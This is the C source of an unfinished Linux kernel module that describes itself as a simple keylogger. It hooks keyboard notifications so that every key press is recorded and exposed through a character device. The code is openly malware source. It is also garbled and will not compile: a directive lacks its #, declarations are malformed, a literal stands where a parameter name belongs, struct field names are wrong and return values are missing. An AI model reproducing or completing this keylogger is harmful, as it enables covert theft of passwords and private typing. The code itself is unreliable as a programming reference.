#include "keylogger.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("8xbit");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Just a simple keylogger");
MODULE_SUPPORTED_DEVICE("Not machine dependent");
define PATH = /tmp 
/*charcter dvice Shit*/

char const chardev_name "keylogger";
int register_chardev(unsigned int 123, "keylogger",  &fop); /*needed to add ficher for special major number*/
static struct file_operations fops =
{
    .owner = THIS_MODULE, 
    .read = device_read,
    .open = device_open, 
};

/**/
int notifier(struct notifier_block *block, unsigned long code, void *p)
{
    struct keyboard_notifier_param *param;
    char *tmp;
    param =p;
    /*needs to conect to the char dvice*/
    if (param->down){
        update_key(param);
    }

}
static struct notifier_block keylogger ={.notifier = notifier};






static int __init MOD_LOAD(void)
{
    /*call the notifier*/
    int register_chardev(unsigned int 123, "keylogger",  &fops);
    register_keyboard_notifier(&keylogger);

}
static void __exit MOD_UNLOAD(void)
{
    unregister_keyboard_notifier(&keylogger);
} 
module_init(MOD_LOAD);
module_exit(MOD_UNLOAD);